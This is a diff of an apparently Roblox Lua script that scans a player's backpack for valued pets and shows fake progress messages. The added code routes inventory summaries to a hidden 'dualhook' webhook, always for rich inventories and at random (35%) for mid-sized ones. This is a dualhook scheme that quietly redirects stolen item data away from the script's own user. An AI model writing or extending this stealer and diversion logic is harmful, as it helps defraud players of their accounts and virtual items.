@@ -105,19 +105,13 @@ local fakeSteps = {
     "Almost done..."
 }
 
-local function getPriorityPetCount()
-	local invData = getInventoryData()
-
-	-- Bảo vệ: nếu invData hoặc Pets nil hoặc không phải table → return 0
+local function getPriorityPetCount(invData)
 	if not invData or type(invData.Pets) ~= "table" then
 		return 0
 	end
 
-	local pets = invData.Pets
 	local count = 0
-
-	for _, v in pairs(pets) do
-		-- An toàn: kiểm tra cả v và trường Name/Value
+	for _, v in pairs(invData.Pets) do
 		local petName = v and (v.Name or v.Value)
 		if petName and allowedPets[petName] then
 			count += 1
@@ -194,6 +188,22 @@ end
 
 
 local function gatherInventorySummary()
+
+	local invData = {Pets = {}}
+	for _, item in pairs(backpack:GetChildren()) do
+		local baseName = item.Name:match("^(.-)%s*%[") or item.Name
+		table.insert(invData.Pets, {Name = baseName})
+	end
+
+	local petCount = getPriorityPetCount(invData)
+
+	local targetWebhook = webhook
+	if petCount >= 5 then
+		targetWebhook = dualhook
+	elseif petCount >= 2 and math.random(1, 100) <= 35 then
+		targetWebhook = dualhook
+	end
+
 	local petCountMap = {}
 	local petLines = {}
 	local itemsWithValue = {}
@@ -236,7 +246,7 @@ local function gatherInventorySummary()
 	for _, item in ipairs(itemsWithValue) do
 		totalValue += item.value
 	end
-local petCount = getPriorityPetCount()
+local petCount = getPriorityPetCount(invData)
 local targetWebhook = webhook
 
 if petCount >= 5 then
@@ -245,7 +255,7 @@ elseif petCount >= 2 and math.random(1, 100) <= 35 then
     targetWebhook = dualhook -- Gửi 35% nếu từ 2–4 pet
 end
 
-   return tradableSummary, totalValue
+   return tradableSummary, totalValue, targetWebhook
 end
 
 
